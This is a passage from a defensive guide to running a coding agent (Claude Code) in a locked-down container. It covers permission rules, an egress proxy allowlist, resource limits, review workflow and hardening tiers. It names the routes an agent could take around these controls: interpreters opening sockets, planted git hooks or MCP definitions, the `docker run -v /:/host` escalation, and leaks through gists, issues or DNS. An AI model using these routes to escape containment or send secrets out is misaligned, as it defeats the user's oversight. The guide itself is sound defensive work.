The deny list is deliberately redundant with the network layer: `curl` is already useless because there is no route out, but denying it means an injection attempt shows up as a *blocked tool call in your transcript* rather than as a failed connection buried in a proxy log. Be clear about the limits of that, though: these rules are advisory against interpreters. `python3` and `node` can open a socket exactly as `curl` would, and they cannot be denied without taking away the tools the agent is there to use. The allowlist and the mounts are the controls; this file decides what you are prompted about. Two entries are there for a reason that is not obvious from the name. `WebSearch` prompts because it runs on Anthropic's servers, never touching squid, so it is the one tool whose network access the proxy cannot see. And `Edit` is denied on the files the *host* executes rather than reviews — `.git/`, `.claude/`, `.mcp.json`, `.envrc`, `.vscode/`, `.npmrc` — because `acceptEdits` would otherwise wave through a git hook or an MCP server definition that runs the moment you or the next session touch the checkout; `enableAllProjectMcpServers: false` closes the same door for `.mcp.json` from the other side.

### Keeping AI attribution out of your git history

Out of the box the CLI can append a `Co-Authored-By: Claude …` trailer to commits and a "Generated with Claude Code" line to pull requests. If your position is that the tool is a tool and you are the author, turn both off. It takes two changes, because they operate at different levels — the setting controls what the harness appends, the instruction controls what the model writes.

In `profile/claude/settings.json`, empty strings mean "append nothing":

```json
  "attribution": {
    "commit": "",
    "pr": ""
  },
```

In `profile/claude/CLAUDE.md`, for everything the setting does not reach — a trailer typed into a commit body, a hand-written PR description, a co-author line copied from an earlier commit:

```markdown
# Git commit conventions

- **Never add a `Co-Authored-By` trailer, or any other AI attribution, to a
  commit message, a pull request, or a merge request.** No "Generated with",
  no tool name, no robot emoji, no "on behalf of".
- You are a tool. The user is the sole author of this work and the only name
  that appears on it.
```

Both ship enabled in the scaffold, and the same pair works outside it: put them in `~/.claude/settings.json` and `~/.claude/CLAUDE.md` for your host account, or in a repo's own `CLAUDE.md` to make it a project convention that applies to everyone.

A rule you don't verify is a rule you don't have, so two checks back it up. `./sandbox verify` asserts both are present in the materialised profile, and `./sandbox review` greps outgoing commits for attribution trailers before you push.

### `profile/claude/CLAUDE.md`

Standing instructions, applied to every session in every project. The scaffold's version tells the agent what environment it's in ("the only writable paths that persist are `/workspace/repo` and `/logs`"), sets house rules (never force-push, run `qa` before claiming success, report test failures with output), and — importantly — tells it how to behave when the sandbox blocks it:

> Outbound network goes through an allowlist proxy. If a host is not on the list the connection fails — that is expected, not a bug to work around. Say which host you need and stop; do not look for another route out.

Without that line, a capable agent that hits a blocked host will reasonably try three other ways to reach it. With it, you get a clear request you can answer with `./sandbox allow`.

### `profile/bin/qa`

A stable command name for "run this project's checks." `CLAUDE.md` can then say *"run `qa` before claiming something works"* without knowing whether the project uses pytest, vitest, or make. The script detects the stack at runtime, and fails closed — a project it recognises but cannot check, or a stack it does not know, is a `FAIL`, not a `PASS` from running nothing. Add your own commands here; they appear on `PATH` in every sandbox you ever create.

### Treat the profile as code

Commit `profile/` to git. Changes to it become reviewable policy changes with authorship and history, rather than undocumented local drift. On a team, this is the difference between "everyone's agent is configured somehow" and "here is our agent policy, in a PR."

The same directory works across machines: clone the scaffold, run `./sandbox init`, and your agent behaves identically on a laptop, a workstation, and a CI runner.

---

## 8. Layer 5 — resource and time limits

> **Defends:** resource exhaustion, cost overruns.

The cgroup limits are already set in the compose file (`pids_limit: 512`, `mem_limit: 4g`, `cpus: 2` — tune via `.env`). Two additions worth having:

**A wall-clock kill switch.** From a second terminal:

```bash
sleep 3600 && docker compose -f agent-sandbox/docker-compose.yml kill agent &
```

Hard stop after an hour, no matter what the agent believes it is doing.

**Disk quota.** The tmpfs mounts are already capped at 1 GB each, so `/tmp` and `$HOME` cannot fill your disk. The worktree is the remaining exposure: keep `agent-sandbox/` on a filesystem with a quota, or add `--storage-opt size=10G` (overlay2 on xfs with pquota enabled).

**Budget limits belong at the API key,** not in the container. Part 5.

---

## 9. The daily workflow

```bash
# 1. Fresh workspace for a fresh task
./sandbox new fix-login

# 2. Fresh tokens in .env, if this session needs any
$EDITOR .env

# 3. Start the agent (the proxy comes up automatically and is health-checked)
./sandbox go

#    or drop into a shell inside the box to poke around
./sandbox shell

# 4. Agent finishes; you exit. The container is gone.

# 5. Review — on the host, in your environment
./sandbox review          # diff --stat, commits, attribution check, untracked files, secret scan
git -C workspace diff origin/main...HEAD    # read the actual diff. all of it.

# 6. Test in your normal environment, not the agent's
cd workspace && npm test && cd ..

# 7. Push — or push and open the PR in one step
./sandbox push
./sandbox pr "Fix session expiry"

# 8. Tear down and revoke
./sandbox destroy
```

`./sandbox review` deliberately shows you **untracked files** as well as the diff. Agents leave things behind — scratch notes, backup copies, a `debug.log`. Those never show up in `git diff`, and they are exactly where an accidentally-written secret ends up.

**The golden rule:** review, test, and push happen in your environment. Never blind-merge agent output. The sandbox makes mistakes cheap; it does not make them disappear.

---

## 10. Getting the work back out: push and pull requests

The agent commits inside the container. Everything after that runs on the host, with your credentials, because that is where the review actually happens.

### Push

```bash
./sandbox push
```

Pushes `<branch>` from `workspace/`, using whatever git auth you already have on the host — SSH agent, credential helper, anything. No token needs to exist inside the container for this to work, which is why Option A in Part 5 is the default.

Where it pushes to is the URL `./sandbox new` recorded in `.env` (`WORKSPACE_ORIGIN`), not whatever `workspace/.git/config` says now. That file is the agent's to write, and so are `.git/hooks` — and git runs a hook, a fsmonitor, a pager or an external diff named in a repo's own config as whoever invoked it, which on the host is you. So every git call `./sandbox` makes against the workspace overrides those keys, `gh`/`glab` get the same overrides, and `review` and `doctor` warn when the workspace's `origin` differs from the recorded one or when keys like `core.hooksPath`, `core.sshCommand` or `credential.helper` are set. A plain `git -C workspace ...` from your shell has none of this protection; read the warnings first.

### Pull request / merge request

```bash
./sandbox pr                       # title = last commit subject
./sandbox pr "Fix session expiry"  # explicit title
```

It pushes, then routes on the remote's host:

| Situation | What happens |
|---|---|
| GitHub + `gh` installed | `gh pr create --base main --head agent/<task>` |
| GitHub, no `gh` | prints `https://github.com/you/repo/compare/main...agent/<task>?expand=1` |
| GitLab + `glab` installed | `glab mr create` (works against self-hosted too) |
| GitLab, no `glab` | git **push options** — the server opens the MR |
| Anything older | prints the "new merge request" URL |

The push-option path is worth knowing by hand, because it needs nothing installed at all:

```bash
git push -o merge_request.create \
         -o merge_request.target=main \
         -o merge_request.title="Fix session expiry" \
         origin agent/fix-login
```

`merge_request.draft`, `merge_request.remove_source_branch` and `merge_request.assign="@you"` work the same way.

### Letting the agent push instead

Only for genuinely long autonomous runs, and with eyes open: a token inside the container is a token a prompt injection can use. If you do it, use a fine-grained single-repo token with a one-day expiry, keep `Bash(git push:*)` in the `ask` list and `--force` in `deny`, and expect a branch — never a merge. A PR the agent opened still gets read by a human before it lands.

---

## 11. Running more than one project

Several repos, across GitHub and a self-hosted GitLab. Two shapes present themselves: **one bundle directory per project**, or **one Linux user per project** sharing a single bundle layout.

**Start with a directory per project. Move a project to its own Linux user only when its credentials must not be readable by your normal account.**

What you should *not* do is run several projects out of one bundle. It has one `project/`, one `workspace/`, one `.env`, one `secrets/` and one allowlist; sharing them means the allowlist becomes the union of every project's needs and every credential is reachable from every session — the opposite of the point.

### A directory per project

```bash
cp -r agent-sandbox agent-sandbox-api
cd agent-sandbox-api
rm -rf project workspace logs/* auth secrets/deploy_key .env
./sandbox init ssh://git@gitlab.example.org:2222/group/api.git
```

The one thing that makes this work is `SANDBOX_NAME`, which `init` sets from the directory name and which prefixes every container, network and volume:

```yaml
name: ${SANDBOX_NAME:-agent-sandbox}
container_name: ${SANDBOX_NAME:-agent-sandbox}-egress-proxy
```

Without it, the second project's `docker compose up` adopts the first project's containers — same compose project name, same hardcoded `container_name` — and you get one proxy serving two allowlists, or an outright name conflict. If you are working from an older copy of this scaffold, add `SANDBOX_NAME` before you copy it.

You get a per-project egress allowlist, per-project credentials, per-project agent policy, and full concurrency: two agents on two repos at once, each behind its own proxy. The one real cost is that `profile/` copies drift apart. If that starts to bite, make `profile/` a git submodule or symlink the shared parts.

### A Linux user per project

Worth the extra setup when the projects have genuinely different trust levels — a client's repo whose deploy key your personal account should not be able to read.

```bash
sudo useradd -m -G docker agent-clientx
sudo -u agent-clientx -i
git clone <your-bundle> ~/agent-sandbox && cd ~/agent-sandbox
./sandbox init git@github.com:clientx/repo.git
```

What it adds: the host's own permissions now separate the projects. In the directory-per-project layout everything runs as you, so anything running as you — including an agent that escapes its container — can read every project's `.env` and `secrets/`. Separate users close that.

What it costs, and this is the part that matters: **membership of the `docker` group is effectively root on the host.** A user in that group can mount `/` into a container in one command, which walks straight through the boundary you just built. If you separate users for isolation, use rootless Podman (or a rootless Docker daemon) per user — otherwise you have paid the cost without buying the property. Add one image cache per user, and a `sudo -u … -i` plus its own `./sandbox login` for every session.

The middle path, which is where most people should land: stay as yourself, one directory per project, `chmod 700` on each bundle's secrets, and a distinct deploy key or token per repo so revocation is per repo. That is the directory layout plus discipline, and it is where the effort-to-benefit curve peaks.

---

## 12. Hardening tiers

Everything so far is the baseline. These are optional, in rough order of effort-to-value.

### Rootless Podman (Linux)

The single highest-value change on this list, and it is one line:

```bash
# agent-sandbox/.env
SANDBOX_RUNTIME=podman
```

`./sandbox` then drives `podman compose` (falling back to `podman-compose`) and layers `docker-compose.podman.yml` over the base file. Every other command is unchanged.

Why it matters more than the seccomp and gVisor tiers below it: **Docker's daemon runs as root, and membership of the `docker` group is equivalent to root on the host.** `docker run -v /:/host` is a one-line escalation, and an escape from a Docker container lands on the host as root. The same escape under rootless Podman lands in your own unprivileged account, inside a user namespace. This also decides the multi-project question in Part 11 — separating projects by Linux user is only a real boundary if the runtime is rootless.

Two things genuinely differ, and both fail *silently*, which is why they get their own compose overlay rather than a paragraph of advice:

**User namespaces.** Rootless Podman maps container uid 0 to your host uid and container uid 1000 to a subuid (typically 100999). The agent runs as uid 1000 precisely so its files come back owned by you; under default mapping they come back owned by `nobody` instead, and you cannot commit them. `userns_mode: "keep-id"` maps your host uid to the same uid inside the container — which is what the image's `HOST_UID` build arg already assumes. Only the agent needs it; the proxy runs as `squid` and reads one world-readable file.

**SELinux.** On Fedora/RHEL/CentOS an unlabelled bind mount is unreadable inside the container, producing a `Permission denied` on a file that obviously exists — the same shape as the deploy-key uid trap in Part 5, and just as easy to misdiagnose. The overlay adds `:z` to every mount. On non-SELinux systems the suffix is accepted and ignored.

Three compose behaviours are weaker under Podman, and `./sandbox` compensates: `depends_on: condition: service_healthy` is not honoured by every provider (so the CLI polls port 3128 itself before starting the agent), `run --build` is not universal (so it builds first), and `compose kill -s HUP` is unreliable (so `reload` signals the container directly).

One real capability gap remains: on rootless **cgroups v1**, `mem_limit`, `cpus` and `pids_limit` are silently ignored, so Part 8's ceilings are not in force. Any current Fedora, RHEL 9+, Ubuntu 22.04+ or Arch is on cgroups v2 already; `./sandbox doctor` tells you which you have.

If your compose provider turns out to be missing features, there is a hybrid: run the real `docker compose` CLI against a rootless Podman socket (`systemctl --user enable --now podman.socket`, then `DOCKER_HOST=unix://$XDG_RUNTIME_DIR/podman/podman.sock`). Podman's security model, Docker Compose's full feature set.

Verify rather than assume — `./sandbox verify` re-runs every wall check inside the real container, and the ownership probe in `docs/11-podman.md` catches a `keep-id` that was quietly dropped.

### seccomp

```bash
./scripts/make-seccomp.sh
# then uncomment the seccomp line in docker-compose.yml and re-run ./sandbox verify
```

This fetches Docker's default profile and strips the syscalls that appear in most container-escape chains and that a coding agent has no business making: `ptrace`, `mount`, `pivot_root`, `setns`, `unshare`, `bpf`, `perf_event_open`, `kexec_load`, `keyctl`, `init_module`, and friends.

Caveat, stated by the script itself: removing `unshare`/`setns` breaks tooling that creates its own namespaces — some sandboxed test runners, nested containers, certain build systems. If a build starts failing with `EPERM` immediately after you enable this, that is why.

### AppArmor / SELinux

A profile denying writes outside `/workspace` is belt-and-braces against a misconfigured mount. Worth it if you're running this on a shared or production-adjacent machine.

### gVisor or Firecracker

Kernel-level isolation rather than namespace isolation. gVisor is the easier of the two:

```bash
docker run --runtime=runsc ...        # or add runtime: runsc to the compose service
```

This is roughly what hosted agent sandboxes (E2B, Modal, Anthropic's own managed environments) use underneath. If you find yourself wanting this, also consider whether a hosted sandbox is simply the better answer — it is the same isolation without the maintenance.

### macOS without Docker

Apple's Seatbelt restricts a native process with no VM. Create `agent.sb`:

```
(version 1)
(deny default)
(allow process-exec* process-fork)
(allow file-read* (subpath "/usr") (subpath "/System") (subpath "/Library")
                  (subpath "/opt/homebrew")
                  (subpath (param "PROJECT_DIR")))
(allow file-write* (subpath (param "PROJECT_DIR")) (subpath "/private/tmp"))
(deny file-read* (subpath (string-append (param "HOME") "/.ssh"))
                 (subpath (string-append (param "HOME") "/.aws")))
(allow network-outbound (remote tcp "api.anthropic.com:443"))
```

```bash
sandbox-exec -f agent.sb -D PROJECT_DIR="$PWD/workspace" -D HOME="$HOME" claude
```

Lighter than a container, but `sandbox-exec` is deprecated-though-functional, the profile language is unforgiving, and you get no egress allowlisting worth the name. Use it when a container genuinely isn't an option; otherwise containers are easier to reason about and portable. Either way, keep the worktree and scoped-token practices — those are runtime-independent.

---

## 13. Troubleshooting

`./sandbox doctor` first — it detects and offers to repair most of the state problems below.

The failures in this section are the ones this setup actually produces. What they have in common is that the obvious diagnosis is wrong every time: the permissions error is a URL-syntax bug, the unhealthy container is a logging bug, the git error is a mount-boundary bug, and the unreadable secret is a uid bug.

### `could not be found or you don't have permission to view it` on `init`

Not a permissions problem, and not a sandbox problem — it fails on the host, before any container exists. You passed an SSH URL with a port in scp-style syntax:

```
git@gitlab.example.org:2222/group/repo.git
```

git's `user@host:path` form **has no port field**. Everything after the first colon is the path, so git connects on port 22 and asks for a repo named `2222/group/repo.git`. GitLab deliberately returns the same message for "does not exist" and "you cannot see it", so it tells you nothing about which.

The giveaway is that a direct SSH test passes, because you typed the port there:

```bash
ssh -p 2222 -T git@gitlab.example.org      # → Welcome to GitLab, @you!
```

Use `ssh://`, the only form that carries a port — `./sandbox init` now rewrites the scp-style version for you and says so:

```bash
./sandbox init ssh://git@gitlab.example.org:2222/group/repo.git
```

Or put the port in `~/.ssh/config` and use a host alias.

### `dependency failed to start: container …-egress-proxy is unhealthy`

The agent never starts, because compose waits on `service_healthy`. The summary hides the real error; get it with `docker compose logs egress-proxy`. If you see `FATAL: Cannot open '/dev/stdout' for writing`, that is the Squid privilege-drop problem — Part 6 has the full explanation and the three-line fix.

### `fatal: not a git repository` — **inside** the container

Everything builds, the proxy is healthy, the agent container is created, and then git dies immediately. The mount is a linked worktree whose `.git` file points at `project/.git/worktrees/<name>`, a host path that is deliberately not mounted. Part 3 explains why a clone is the right shape; `./sandbox doctor` converts an existing worktree.

### The three worktree errors that chase each other

| Error | State | Fix |
|---|---|---|
| `not a git repository: …/worktrees/workspace` | checkout exists, registration gone | `rm -rf workspace` |
| `missing but already registered worktree` | registration exists, checkout gone | `git -C project worktree prune -v` |
| `a branch named 'agent/x' already exists` | failed `worktree add -b` left its branch | `git -C project branch -D agent/x` |

Each fix creates the next state, which is why it feels like whack-a-mole. `prune` only ever addresses the middle row. Clone-based workspaces make all three impossible.

### `install: cannot open '/run/secrets/deploy_key' for reading: Permission denied`

The file exists — the `[ -f ]` test passes — but a `0600` key is readable only by its owning uid, and the container runs as `HOST_UID`. Compare `ls -la secrets/deploy_key`, `grep HOST_UID .env`, and `id -u`; fix whichever is stale. Part 5 has the commands.

### Everything else

| Symptom | Cause and fix |
|---|---|
| `permission denied` talking to docker (Linux) | `sudo usermod -aG docker $USER`, then log out and back in. |
| Files in `workspace/` owned by root or nobody | `HOST_UID`/`HOST_GID` in `.env` don't match `id -u`/`id -g`. Fix and rebuild: `docker compose build --no-cache agent`. |
| `read-only file system` where a tool needs a cache | Add a tmpfs for it: `- /home/agent/.npm:size=512m`. Don't reach for `read_only: false`. |
| Agent can't reach its API | Host missing from `proxy/allowlist.txt`, or the proxy isn't up. `./sandbox logs proxy` shows the `TCP_DENIED` and the exact hostname it wanted. |
| Everything is denied, including allowlisted hosts | CRLF line endings in `allowlist.txt` — Squid reads `github.com\r` as a different domain. `sed -i 's/\r$//' proxy/allowlist.txt`. |
| Proxy restarts in a loop, no `/dev/stdout` error | `docker compose logs egress-proxy` — usually a `squid.conf` syntax error, named with a line number. |
| Re-asked to log in every session | Expected: `$HOME` is a tmpfs. `./sandbox login` saves the session to `auth/`. Part 5. |
| `$HOME` not writable inside the container | The tmpfs `uid=`/`gid=` options didn't apply on your Docker version. Use mode `0777`, or `--userns=keep-id` under Podman. |
| `git push` hangs from inside the container | Port 22 is not proxyable. Use the deploy-key setup (Part 5), which routes over 443, or push from the host with `./sandbox push`. |
| `./sandbox push` "succeeds" but the server shows nothing | An old bundle whose `workspace` `origin` still points at local `project/`. Re-run `./sandbox new`; current versions push to the URL recorded in `.env`, not to the workspace's `origin`. |
| Two projects fighting over one proxy | Both bundles have the same `SANDBOX_NAME`. Part 11. |
| Build fails at `npm install -g` | Build-time network is *not* proxied — ordinary connectivity, or a corporate MITM proxy whose CA the image needs. |
| Agent stops being able to run commands mid-session | Hit `pids_limit`. Raise it, and check `tini` is actually PID 1 (`docker compose exec agent ps 1`). |

---

## 14. What this does *not* protect against

A sandbox that oversells itself is worse than one you understand the limits of.

**Exfiltration through allowlisted hosts.** `.github.com` is on the list because the agent needs it. An agent with a write token can also create a public gist, open an issue containing your `.env`, or push a branch with secrets in it. The egress allowlist controls *destinations*, not *content*. This is why `./sandbox review` runs a secret scan before anything is pushed, and why Option A — no repo credentials at all — is the default.

**Content-level inspection.** There is no TLS interception, so the proxy sees hostnames, not payloads. That is a deliberate trade (no CA in the container, no plaintext traffic on disk), but it means "allowed host" and "safe request" are not the same statement.

**DNS.** Docker's embedded resolver handles name resolution before the proxy sees anything. Data can in principle be tunnelled through DNS queries. Defending against this means an internal resolver with query logging — worth it in a corporate setting, overkill on a laptop.

**Container escape.** Namespaces are not a security boundary in the way a VM is. Non-root, dropped caps, `no-new-privileges`, and seccomp raise the bar considerably, but if you are running genuinely untrusted code, use gVisor or a real VM.

**Supply chain at build time.** `npm install -g @anthropic-ai/claude-code` runs with normal network access when you build the image. The runtime is locked down; the build is not. Pin versions, and rebuild deliberately rather than automatically.

**The model's judgement.** None of this stops an agent from writing subtly wrong code, confidently. It stops that code from reaching anything before you have read it. Human review is the last layer, and it is not optional.

---

## 15. Checklist

- [ ] The **host account** running the sandbox has no sudo, is not in `wheel`/`admin`/`docker`, and is absent from every `NOPASSWD` rule
- [ ] Agent runs as a non-root user in a container, never on the bare host
- [ ] Root filesystem is read-only; only the workspace and `/logs` persist
- [ ] A fresh clone on a throwaway branch per task — never the main checkout, and not a linked worktree
- [ ] No real credentials mounted: no `~/.ssh`, no `~/.aws`, no `~/.config/gcloud`
- [ ] Repo access is a fine-grained, single-repo, ≤1-day token — or nothing at all
- [ ] Model API key is separate, with its own spend limit
- [ ] If a login is saved in `auth/`: `chmod 700`, gitignored, and not used for unattended runs
- [ ] Egress is default-deny; the allowlist is short and every entry is justified
- [ ] The proxy runs unprivileged from the start — no runtime `setuid()`
- [ ] Capabilities dropped, `no-new-privileges` set, seccomp profile applied if the agent runs untrusted code
- [ ] CPU, memory, PID, disk, and wall-clock ceilings all set
- [ ] Agent-level permission rules deny destructive commands and gate installs and pushes
- [ ] Commit attribution suppressed in both `settings.json` and `CLAUDE.md`
- [ ] Config lives in `profile/`, mounted read-only, committed to git
- [ ] Every command logged to `/logs`, outside the container
- [ ] One repo per bundle, each with a distinct `SANDBOX_NAME`
- [ ] `./sandbox verify` passes — the walls are tested, not assumed
- [ ] Diff, attribution check and secret scan reviewed on the host before anything is pushed
- [ ] Container destroyed and tokens revoked at the end of every session

---

## 16. Glossary

**Bind mount** — a host directory made visible inside a container. The agent sees exactly one: the worktree.

**Capability** — a slice of root's power (mount filesystems, use raw sockets, trace processes) that Linux can grant or drop individually. We drop all of them.

**Default-deny egress** — block all outbound traffic, then permit named exceptions. The opposite, and the correct direction: blocklists fail open.

**Ephemeral** — exists only for the session. The container, its home directory, and its `/tmp` all are.

**git worktree** — a second checkout of the same repository in a separate directory, on its own branch, sharing one `.git` store. Deliberately *not* used here: the shared store lives in a directory the container cannot see (Part 3).

**Prompt injection** — instructions hidden in content the agent reads (a webpage, a README, a dependency's docs) that hijack its behaviour. The reason egress control matters more than any prompt-level defence.

**Profile** — in this guide, the version-controlled directory of agent defaults that is reapplied to every regenerated sandbox.

**seccomp** — a kernel filter restricting which syscalls a process may make.

**tmpfs** — a RAM-backed filesystem. Fast, and gone when the container exits.

**gVisor / Firecracker** — stronger isolation via a userspace kernel or a microVM, rather than namespaces alone.
